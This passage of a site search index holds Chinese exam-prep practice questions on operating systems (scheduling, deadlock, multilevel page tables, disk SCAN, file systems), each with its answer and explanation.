C.\u5728\u6267\u884c\u5b8c\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u7528\u6237\u8fdb\u7a0b\u65f6\u3002 D.\u5c31\u7eea\u8fdb\u7a0b\u4e2d\u67d0\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e\u5f53\u524d\u7684\u6267\u884c\u8fdb\u7a0b \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5728\u53ef\u5265\u593a\u65b9\u5f0f\u4e0b\u5f15\u8d77\u8c03\u5ea6\u7684\u539f\u56e0\u662f\u5c31\u7eea\u8fdb\u7a0b\u4e2d\u67d0\u8fdb\u7a0b\u7684\u4f18\u5148\u7ea7\u9ad8\u4e8e\u5f53\u524d\u6267\u884c\u7684\u8fdb\u7a0b\u3002\u9898\u4e2d\u5e76\u672a\u6307\u660e\u7cfb\u7edf\u662f\u5206\u65f6\u7cfb\u7edf,A\u9519\u8bef\u3002\u6267\u884cP\u539f\u8bed\u64cd\u4f5c\u4f1a\u5bfc\u81f4\u4e2d\u65ad,\u4e0d\u4e00\u5b9a\u4f1a\u5f15\u8d77\u8c03\u5ea6(\u4f8b\u5982\u6b64\u65f6\u5185\u5b58\u4e2d\u53ea\u6709\u4e00\u4e2a\u8fdb\u7a0b),B\u9519\u8bef\u3002\u5728\u6267\u884c\u5b8c\u7cfb\u7edf\u8c03\u7528\u540e\u8fd4\u56de\u7528\u6237\u7a0b\u5e8f,\u5982\u679c\u6b64\u65f6\u7528\u6237\u7a0b\u5e8f\u4f18\u5148\u7ea7\u4ecd\u7136\u662f\u6700\u9ad8,\u5219\u4e0d\u4f1a\u5f15\u8d77\u8c03\u5ea6,C\u9519\u8bef\u3002 3.3. Wed # \u5728\u865a\u62df\u5185\u5b58\u7ba1\u7406\u4e2d\uff0c\u5730\u5740\u53d8\u6362\u673a\u6784\u5c06\u903b\u8f91\u5730\u5740\u53d8\u6362\u4e3a\u7269\u7406\u5730\u5740\uff0c\u5f62\u6210\u8be5\u903b\u8f91\u5730\u5740\u7684\u9636\u6bb5\u662f \u3002\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e\u7f16\u8f91 B\uff0e\u7f16\u8bd1 C\uff0e\u94fe\u63a5 D\uff0e\u88c5\u8f7d \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u7f16\u8bd1\u8fc7\u7a0b\u6307\u7f16\u8bd1\u7a0b\u5e8f\u5c06\u7528\u6237\u6e90\u4ee3\u7801\u7f16\u8bd1\u6210\u76ee\u6807\u6a21\u5757\u3002\u6e90\u5730\u5740\u7f16\u8bd1\u6210\u76ee\u6807\u7a0b \u5e8f\u65f6\uff0c\u4f1a\u5f62\u6210\u903b\u8f91\u5730\u5740\u3002 3.4. Thu # \u4e00\u4e2a\u591a\u9053\u6279\u5904\u7406\u7cfb\u7edf\u4e2d\u4ec5\u6709P1 \u548cP2 \u4e24\u4e2a\u4f5c\u4e1a\uff0cP2 \u6bd4P1 \u665a5ms \u5230\u8fbe\uff0c\u5b83\u4eec\u7684\u8ba1\u7b97\u548cI/O\u64cd\u4f5c\u987a\u5e8f\u5982\u4e0b\uff1a P1\uff1a\u8ba1\u7b9760ms\uff0cI/O 80ms\uff0c\u8ba1\u7b9720ms P2\uff1a\u8ba1\u7b97120ms\uff0cI/O 40ms\uff0c\u8ba1\u7b9740ms \u82e5\u4e0d\u8003\u8651\u8c03\u5ea6\u548c\u5207\u6362\u65f6\u95f4\uff0c\u5219\u5b8c\u6210\u4e24\u4e2a\u4f5c\u4e1a\u9700\u8981\u7684\u65f6\u95f4\u6700\u5c11\u662f \u3002\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e240ms B\uff0e260ms C\uff0e340ms D\uff0e360ms \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aP2\u6bd4P1\u665a5ms\u5230\u8fbe\uff0cP1\u5148\u5360\u7528CPU\u3002 t = 0ms \u65f6\uff0cP1\u8ba1\u7b97 60ms\uff0cP2\u7b49\u5f85\u3002 t = 60ms \u65f6\uff0cP2\u8ba1\u7b97120ms\uff0cP1 I/O 80ms\u3002 t = 180ms \u65f6\uff0cP2 I/O 40ms\uff0c P1 \u8ba1\u7b97 20ms\uff0cP1\u7ed3\u675f\u3002 t = 220ms \u65f6\uff0cP2 \u8ba1\u7b97 40ms t = 260ms \u65f6\uff0cP2\u7ed3\u675f\u3002 4. Week 4 # 4.1. Tue # \u4e0b\u5217\u54ea\u4e2a\u5bf9\u8c61\u4e0d\u5c5e\u4e8e\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\uff1a \uff3b\u4e2d\u56fd\u79d1\u5b66\u9662\u5927\u5b66-2016\uff3d A. \u5206\u533a\u8868 B. \u76ee\u5f55 C. \u8d85\u7ea7\u5757 D. \u7a7a\u95f2\u5757\u8868 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u76ee\u5f55\u7528\u4e8e\u6587\u4ef6\u7684\u903b\u8f91\u7ec4\u7ec7\uff0c\u8d85\u7ea7\u5757\u5305\u542b\u6587\u4ef6\u7cfb\u7edf\u7684\u603b\u4f53\u4fe1\u606f\uff0c\u7a7a\u95f2\u5757\u8868\u5bf9\u78c1\u76d8\u7684\u7a7a\u95f2\u5757\u8fdb\u884c\u7ba1\u7406\uff0c\u5b83\u4eec\u90fd\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u4e00\u90e8\u5206\u3002","title":"2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2020-august","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 August \u76ee\u5f55 1. Week 1 1.1. Mon 1.2. Tue 1.3. Wed 1.4. Thu 1.5. Fri 2. Week 2 2.1. Sat 2.2. Sun 3. Week 3 3.1. Mon 3.2. Tue 3.3. Wed 3.4. Thu 4. Week 4 4.1. Tue","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#1-week-1","text":"","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#11-mon","text":"\u6d89\u53ca\u67d0\u4e00\u8d44\u6e90\u9020\u6210\u4e0e\u65f6\u95f4\u6709\u5173\u7684\u9519\u8bef\u7684\u539f\u56e0\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u5357\u4eac\u7406\u5de5\u5927\u5b66\uff3d A\uff0e\u4e00\u4e2a\u8fdb\u7a0b\u591a\u6b21\u7533\u8bf7\uff0c\u91ca\u653e\u8be5\u8d44\u6e90 B\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90 C\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u4f7f\u7528\u8be5\u8d44\u6e90 D\uff0e\u4ee5\u4e0a\u8bf4\u6cd5\u5747\u4e0d\u5bf9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e00\u4e2a\u8fdb\u7a0b\u4e0d\u53ef\u80fd\u5f15\u8d77\u6b7b\u9501\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u7684\u4f7f\u7528\u8d44\u6e90\uff0c\u7cfb\u7edf\u4f1a\u91c7\u7528P\uff0cV\u64cd\u4f5c\u5bf9\u8d44\u6e90\u8fdb\u884c\u7ba1\u7406\uff0c\u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5bf9B\u9009\u9879\uff0c\u82e5\u4e0d\u52a0\u9650\u5236\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90\uff0c\u800c\u8d44\u6e90\u6709\u9650\u65f6\uff0c\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u6b7b\u9501\u3002","title":"1.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#12-tue","text":"\u4e0b\u5217\u9009\u9879\u4e2d\uff0c\u5c5e\u4e8e\u591a\u7ea7\u9875\u8868\u4f18\u70b9\u7684\u662f \u3002\uff3b\u5357\u4eac\u5927\u5b66\uff3d A\uff0e\u52a0\u5feb\u5730\u5740\u53d8\u6362\u901f\u5ea6 B\uff0e\u51cf\u5c11\u7f3a\u9875\u4e2d\u65ad\u6b21\u6570 C\uff0e\u51cf\u5c11\u9875\u8868\u9879\u6240\u5360\u5b57\u8282\u6570 D\uff0e\u51cf\u5c11\u9875\u8868\u6240\u5360\u7684\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u591a\u7ea7\u9875\u8868\u662f\u57fa\u4e8e\u865a\u62df\u5730\u5740\u7684\u5206\u6bb5\u6765\u5212\u5206\u7b49\u7ea7\u7684\uff0c\u6700\u4f4e\u7b49\u7ea7\u7684\u9875\u8868\u4e0a\u4fdd\u5b58\u4e86\u6700\u7ec8\u7684\u865a\u62df\u9875\u53f7\u548c\u7269\u7406\u9875\u53f7\u7684\u5bf9\u5e94\u5173\u7cfb\u3002\u4f8b\u5982\u62ff32\u4f4d\u7684\u865a\u62df\u5730\u5740\u6765\u8bf4\uff0c\u5982\u679c\u9875\u9762\u7684\u5927\u5c0f\u4e3a4K\uff0c\u4e5f\u5c31\u662f12\u4f4d\uff0c\u90a3\u4e48\u5730\u5740\u7a7a\u95f4\u5185\u5c06\u670920\u4f4d\uff0c\u4e5f\u5c31\u662f1M\u7684\u9875\u8868\u9879\u76ee\uff0c\u6bcf\u4e2a\u9879\u76ee\u5bf9\u5e94\u4e00\u4e2a\u865a\u62df\u9875\u9762\u3002\u90a3\u4e48\u5bf9\u4e8e\u5730\u5740\u7a7a\u95f4\u4e2d\u7528\u4e8e\u8868\u793a\u9875\u53f7\u768420\u4f4d\u5730\u5740\u518d\u6b21\u5206\u7ea7\uff0c\u5206\u621010\u4f4d\u7684\u4e00\u7ea7\u9875\u53f7\u548c10\u4f4d\u7684\u4e8c\u7ea7\u9875\u53f7\u5462\u3002\u5c31\u662f\u8bf4\u6839\u636e\u4e00\u7ea7\u9875\u53f7\u53ef\u4ee5\u77e5\u90531K\u4e2a\u8fde\u7eed\u7684\u9875\u9762\u4e2d\u662f\u5426\u5df2\u7ecf\u6709\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u6216\u8005\u88ab\u7f6e\u6362\u5230\u4ea4\u6362\u7a7a\u95f4\u4e2d\u7684\uff0c\u5982\u679c\u4e00\u7ea7\u9875\u8868\u4e2d\u8fd91K\u4e2a\u9875\u9762\u6ca1\u6709\u4efb\u610f\u4e00\u4e2a\u9875\u9762\u88ab\u52a0\u8f7d\u6216\u8005\u7f6e\u6362\u8fc7\uff0c\u90a3\u4e48\u5c31\u4e0d\u9700\u8981\u5728\u4e3a\u8fd91K\u4e2a\u9875\u9762\u7ef4\u62a42\u7ea7\u9875\u8868\u4e86\u3002 \u7406\u8bba\u4e0a\u6765\u8bf4\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u5f00\u59cb\u8fd0\u884c\u7684\u65f6\u5019\u53ea\u9700\u89813\u4e2a1K\u7684\u9875\u9762\u5c31\u53ef\u4ee5\u8fd0\u884c\u4e86\uff0c\u5373\u4e00K\u7684\u4ee3\u7801\u6bb5\u9875\u9762\uff0c\u4e00K\u7684\u6570\u636e\u6bb5\u9875\u9762\u548c\u4e00K\u7684\u685f\u9875\u9762\u3002\u56e0\u6b64\uff0c\u53ea\u9700\u89811K\u4e2a\u4e00\u7ea7\u9875\u8868\u5355\u5143\u4e00\u7ea73K\u4e2a\u4e8c\u7ea7\u9875\u8868\u5355\u5143\u5373\u53ef\uff0c\u8fdc\u8fdc\u5c0f\u4e8e\u8fde\u7eed\u9875\u9762\u7c7b\u578b\u7684\u9875\u8868\u9700\u8981\u76841M\u7684\u9875\u8868\u5355\u5143\uff0c\u6545\u51cf\u5c11\u4e86\u6240\u9700\u5360\u7684\u8fde\u7eed\u5185\u5b58\u7a7a\u95f4\uff0cD\u6b63\u786e\u3002 \u6b64\u5916\uff0c\u7531\u4e8e\u591a\u6b21\u8bbf\u5b58\uff0c\u591a\u7ea7\u9875\u8868\u4f1a\u51cf\u6162\u5730\u5740\u8f6c\u6362\u901f\u5ea6\uff0cA\u9519\u8bef\u3002","title":"1.2. Tue"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#13-wed","text":"\u5047\u8bbe\u78c1\u5934\u5f53\u524d\u4f4d\u4e8e\u7b2c105\u9053\uff0c\u6b63\u5728\u5411\u78c1\u9053\u5e8f\u53f7\u589e\u52a0\u7684\u65b9\u5411\u79fb\u52a8\u3002\u73b0\u6709\u4e00\u4e2a\u78c1\u9053\u8bbf\u95ee\u8bf7\u6c42\u5e8f\u5217\u4e3a35\uff0c45\uff0c12\uff0c68\uff0c110\uff0c180\uff0c170\uff0c195\uff0c\u91c7\u7528SCAN\u8c03\u5ea6(\u7535\u68af\u8c03\u5ea6)\u7b97\u6cd5\u5f97\u5230\u7684\u78c1\u9053\u8bbf\u95ee\u5e8f\u5217\u662f \uff3b\u5409\u6797\u5927\u5b66\uff3d A\uff0e110\uff0c170\uff0c180\uff0c195\uff0c68\uff0c45\uff0c35\uff0c12 B\uff0e110\uff0c68\uff0c45\uff0c35\uff0c12\uff0c170\uff0c180\uff0c195 C\uff0e110\uff0c170\uff0c180\uff0c195\uff0c12\uff0c35\uff0c45\uff0c68 D\uff0e12\uff0c35\uff0c45\uff0c68\uff0c110\uff0c170\uff0c180\uff0c195 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u672c\u9898\u8003\u67e5\u78c1\u9053\u8c03\u5ea6\u7b97\u6cd5\u3002SCAN\u8c03\u5ea6\u7b97\u6cd5\u5728\u78c1\u5934\u5f53\u524d\u79fb\u52a8\u65b9\u5411\u4e0a\u9009\u62e9\u4e0e\u5f53\u524d\u78c1\u5934\u6240\u5728\u78c1\u9053\u8ddd\u79bb\u6700\u8fd1\u7684\u8bf7\u6c42\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u670d\u52a1\u5bf9\u8c61\u3002\u5f53\u524d\u78c1\u9053\u5411\u5e8f\u53f7\u589e\u52a0\u7684\u65b9\u5411\u79fb\u52a8\uff0c\u5f53\u524d\u4f4d\u4e8e\u7b2c105\u9053\uff0c\u5219\u8ddd\u79bb\u6700\u8fd1\u7684\u4e0b\u4e00\u4e2a\u5e94\u8be5\u662f\u7b2c110\u78c1\u9053\uff0c\u4f9d\u6b21\u9012\u589e\u5230\u6700\u9ad8195\uff0c\u518d\u5411\u5e8f\u53f7\u51cf\u5c11\u7684\u65b9\u5411\u79fb\u52a8\uff0c\u79bb\u5f53\u524d195\u78c1\u9053\u6700\u8fd1\u7684\u662f68\u53f7\u78c1\u9053\uff0c\u4f9d\u6b21\u9012\u589e\u5230\u6240\u6709\u7684\u8bf7\u6c42\u5b8c\u6210\uff0c\u6240\u4ee5\u78c1\u9053\u8bbf\u95ee\u5e8f\u5217\u4e3a110\uff0c170\uff0c180\uff0c195\uff0c68\uff0c45\uff0c35\uff0c12\u3002","title":"1.3. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#14-thu","text":"\u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u7684\u4e3b\u8981\u76ee\u7684\u662f \uff3b\u5409\u6797\u5927\u5b66\uff3d A. \u8282\u7701\u5916\u5b58\u7a7a\u95f4 B. \u8282\u7701\u5185\u5b58\u7a7a\u95f4 C. \u52a0\u5feb\u6587\u4ef6\u7684\u68c0\u7d22\u901f\u5ea6 D. \u52a0\u5feb\u6587\u4ef6\u7684\u8bfb/\u5199\u901f\u5ea6 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7edd\u5bf9\u8def\u5f84\u540d(\u5168\u8def\u5f84\u540d)\uff1a\u4ece\u6839\u76ee\u5f55\u5f00\u59cb\u5230\u8fbe\u6240\u8981\u67e5\u627e\u6587\u4ef6\u7684\u8def\u5f84\u3002\u9664\u4e86\u7edd\u5bf9\u8def\u5f84\u540d\u4ee5\u5916\uff0c\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u7528\u6237\u8bbe\u7f6e\u4e00\u4e2a\u5f53\u524d\u76ee\u5f55(\u53c8\u79f0\u5de5\u4f5c\u76ee\u5f55)\uff0c\u8bbf\u95ee\u67d0\u4e2a\u6587\u4ef6\u65f6\uff0c\u5c31\u4ece\u5f53\u524d\u76ee\u5f55\u5f00\u59cb\u5411\u4e0b\u987a\u6b21\u68c0\u7d22\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u7684\u4e3b\u8981\u76ee\u7684\u662f\u52a0\u5feb\u6587\u4ef6\u7684\u68c0\u7d22\u901f\u5ea6\u3002\u8282\u7701\u5916\u5b58\u7a7a\u95f4\uff0c\u8282\u7701\u5185\u5bb9\u7a7a\u95f4\uff0c\u52a0\u5feb\u6587\u4ef6\u7684\u8bfb\u5199\u901f\u5ea6\u90fd\u4e0e\u8bbe\u7f6e\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u65e0\u5173\u3002","title":"1.4. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#15-fri","text":"\u5df2\u77e5\u67d0\u8ba1\u7b97\u673a\u7cfb\u7edf\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u91c7\u7528\u786c\u4ef6\u652f\u6301\u7684\u4e8c\u7ea7\u9875\u8868\uff0c\u9875\u8868\u9879\u4f4d64bit\uff0c\u9875\u9762\u5927\u5c0f\u4e3a4KB\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8fde\u7eed\u8bbf\u95ee\u957f\u5ea6\u4e3a1MB \u7684\u6570\u7ec4\u4e14\u8fc7\u7a0b\u4e2d\u672a\u53d1\u751f\u4e2d\u65ad\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6700\u591a\u4f1a\u8bbf\u95ee\u591a\u5c11\u6b21\u5185\u5b58\u4e2d\u7684\u9875\u8868\uff1f\uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863-2018\uff3d A. 128 B. 256 C. 512 D. 1024 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a1MB/4KB=256\u9875\uff0c\u4e00\u9875\u53ef\u4ee5\u5305\u542b4KB/8B=512\u9875\u8868\u9879\uff0c\u6240\u4ee5256\u9875\u9700\u8981\u4e00\u4e2a\u4e8c\u7ea7\u9875\u8868\u5c31\u591f\u4e86\u3002\u8bbf\u95ee256\u6b21\uff0c\u6bcf\u6b21\u8bbf\u95ee\u4e24\u7ea7\u9875\u8868\uff0c256*2=512\u6b21\u9875\u8868\u3002","title":"1.5. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#2-week-2","text":"","title":"2. Week 2"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#21-sat","text":"\u67d0\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u67098 \u53f0\u6253\u5370\u673a\uff0c\u7531K \u4e2a\u8fdb\u7a0b\u7ade\u4e89\u4f7f\u7528\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u89813 \u53f0\u6253\u5370\u673a\u3002\u8be5\u7cfb\u7edf\u53ef\u80fd\u4f1a\u53d1\u751f\u6b7b\u9501\u7684K \u7684\u6700\u5c0f\u503c\u662f______\u3002\uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863\uff3d A. 2 B. 3 C. 4 D. 5 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5bf9\u4e8e\u4e09\u4e2a\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u6709\u4e24\u4e2a\u8fdb\u7a0b\u5206\u522b\u83b7\u5f973\u53f0\uff0c\u4f7f\u5176\u6267\u884c\u5b8c\u91ca\u653e\u540e\u8ba9\u7b2c\u4e09\u4e2a\u8fdb\u7a0b\u83b7\u5f973\u53f0\uff0c\u4e0d\u4f1a\u4ea7\u751f\u6b7b\u9501\uff1b\u5bf9\u4e8e\u56db\u4e2a\u8fdb\u7a0b\uff0c\u5047\u82e5\u6bcf\u4e2a\u8fdb\u7a0b\u5404\u83b7\u5f972\u53f0\u800c\u540c\u65f6\u9700\u8981\u53e6\u5916\u4e00\u53f0\uff0c\u8fd9\u5c31\u4f1a\u4ea7\u751f\u6b7b\u9501\uff0c\u6240\u4ee5\u4ea7\u751f\u6b7b\u9501\u7684\u6700\u5c0f\u503c\u662f4\u3002 \u3010\u603b\u7ed3\u9898\u578b\u3011\uff1a\u5047\u8bbe\u73b0\u5728\u6709 P \u4e2a\u8fdb\u7a0b\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u6700\u591a\u9700\u8981 m \u4e2a\u8d44\u6e90\uff0c\u5e76\u4e14\u6709 r \u4e2a\u8d44\u6e90\u53ef\u7528\u3002\u4ec0\u4e48\u6837\u7684\u6761\u4ef6\u53ef\u4ee5\u4fdd\u8bc1\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\uff1f \u89e3\uff1a\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u6709 m \u4e2a\u8d44\u6e90\u5b83\u5c31\u80fd\u591f\u7ed3\u675f\uff0c\u4e0d\u4f1a\u4f7f\u81ea\u5df1\u9677\u5165\u6b7b\u9501\u4e2d\u3002\u56e0\u6b64\u6700\u5dee\u60c5\u51b5\u662f\u6bcf\u4e2a\u8fdb\u7a0b\u6709 m-1 \u4e2a\u8d44\u6e90\u5e76\u4e14\u9700\u8981\u53e6\u5916\u4e00\u4e2a\u8d44\u6e90\u3002\u5982\u679c\u7559\u4e0b\u6709\u4e00\u4e2a\u8d44\u6e90\u53ef\u7528\uff0c\u90a3\u4e48\u5176\u4e2d\u67d0\u4e2a\u8fdb\u7a0b\u5c31\u80fd\u591f\u7ed3\u675f\u5e76\u91ca\u653e\u5b83\u7684\u6240\u6709\u8d44\u6e90\uff0e\u4f7f\u5176\u5b83\u8fdb\u7a0b\u4e5f\u80fd\u591f\u7ed3\u675f\u3002\u6240\u4ee5\u907f\u514d\u6b7b\u9501\u7684\u6761\u4ef6\u662f\uff1a r \\le p(m-1)+1 \u7531\u6b64\u6761\u4ef6\u89e3\u4e0a\u9898\uff1a r=8\uff0cm=3 \uff0c\u5e26\u5165\u516c\u5f0f\u5f97\uff1a 2p \\le 7 \u3002\u5373\u5f53P\u5c0f\u4e8e\u7b49\u4e8e3\u65f6\u624d\u53ef\u4fdd\u8bc1\u6b7b\u9501\u4e0d\u4f1a\u53d1\u751f\uff0c\u6240\u4ee5\u53ef\u80fd\u4f1a\u4ea7\u751f\u6b7b\u9501\u7684\u6700\u5c0f\u503c\u662f4\u3002","title":"2.1. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#22-sun","text":"\u7528\u6237\u7a0b\u5e8f\u53d1\u51fa\u78c1\u76d8I/O \u8bf7\u6c42\u540e\uff0c\u7cfb\u7edf\u7684\u5904\u7406\u6d41\u7a0b\u662f\uff1a\u7528\u6237\u7a0b\u5e8f\u2192\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f\u2192\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u2192\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u5176\u4e2d\uff0c\u8ba1\u7b97\u6570\u636e\u6240\u5728\u78c1\u76d8\u7684\u67f1\u9762\u53f7\u3001\u78c1\u5934\u53f7\u3001\u6247\u533a\u53f7\u7684\u7a0b\u5e8f\u662f \uff3b\u4e2d\u56fd\u79d1\u5b66\u9662863\uff3d A\uff0e\u7528\u6237\u7a0b\u5e8f B\uff0e\u7cfb\u7edf\u8c03\u7528\u5904\u7406\u7a0b\u5e8f C\uff0e\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f D\uff0e\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u8ba1\u7b97\u78c1\u76d8\u53f7\u3001\u78c1\u5934\u53f7\u548c\u6247\u533a\u53f7\u7684\u5de5\u4f5c\u662f\u7531\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u5b8c\u6210\u7684\uff0c\u7b54\u6848\u9009C\u3002","title":"2.2. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#3-week-3","text":"","title":"3. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#31-mon","text":"\u8f6e\u8f6c\u6cd5\u8fdb\u7a0b\u8c03\u5ea6\u4e2d\uff0c\u5982\u679c\u65f6\u95f4\u7247\u957f\u5ea6\u4e00\u5b9a\uff0c\u5219 \uff0c\u54cd\u5e94\u65f6\u95f4\u8d8a\u77ed\uff3b\u4e91\u5357\u5927\u5b66831\uff3d A\uff0e\u8fdb\u7a0b\u7b49\u5f85\u65f6\u95f4\u8d8a\u957f B\uff0e\u5c31\u7eea\u961f\u5217\u4e2d\u8fdb\u7a0b\u6570\u8d8a\u5c11 C\uff0e\u8fdb\u7a0b\u8981\u6c42\u8fd0\u884c\u65f6\u95f4\u8d8a\u77ed D\uff0e\u5185\u5b58\u8d8a\u5c0f \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u54cd\u5e94\u65f6\u95f4\u4e3b\u8981\u7531\u65f6\u95f4\u7247\u5927\u5c0f\uff0c\u5c31\u7eea\u961f\u5217\u7b49\u5f85\u6570\u76ee\u4e24\u4e2a\u56e0\u7d20\u51b3\u5b9a\uff0c\u7b54\u6848\u9009B\u3002","title":"3.1. Mon"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_August/#32-tue","text":"\u5728\u53ef\u5265\u593a\u65b9\u5f0f\u4e0b\u5f15\u8d77\u8c03\u5ea6\u7684\u539f\u56e0\u662f \uff3b\u4e91\u5357\u5927\u5b66831\uff3d A.\u5728\u5206\u65f6\u7cfb\u7edf\u4e2d\u65f6\u95f4\u7247\u5df2\u7528\u5b8c B.\u6267\u884c\u4e2d\u7684\u8fdb\u7a0b\u8c03\u7528\u4e86P\u539f\u8bed\u64cd\u4f5c\u3002 C.\u5728\u6267\u884c\u5b8c\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de\u7528\u6237\u8fdb\u7a0b\u65f6\u3002 